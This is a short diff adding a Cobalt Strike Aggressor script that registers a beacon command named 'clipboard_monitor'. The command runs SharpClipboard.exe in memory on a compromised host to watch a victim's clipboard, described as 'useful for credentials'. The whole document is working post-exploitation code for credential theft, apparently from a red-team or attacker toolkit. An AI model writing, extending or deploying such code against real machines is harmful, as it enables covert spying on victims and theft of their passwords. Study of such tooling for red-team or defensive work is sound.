@@ -1,0 +1,18 @@
+beacon_command_register("clipboard_monitor", "This will monitor a victims clipboard for changes - may be useful for credentials",
+	"Usage: clipboard_monitor \n\n" .
+	"Monitor a victims clipboard for changes - may be useful for credentials\n");
+alias clipboard_monitor{
+	local('$bid $asm $desc @args $argu');
+	$bid = $1;
+	$desc = "Clipboard Monitor";
+	@args = @_;
+	remove(@args, $bid);
+	$argu = join(' ', @args);
+	if ($argu eq ""){
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
+	}
+	else{
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
+	}
+	bexecute_assembly!($bid, script_resource("exe/SharpClipboard.exe"), $argu);
+}
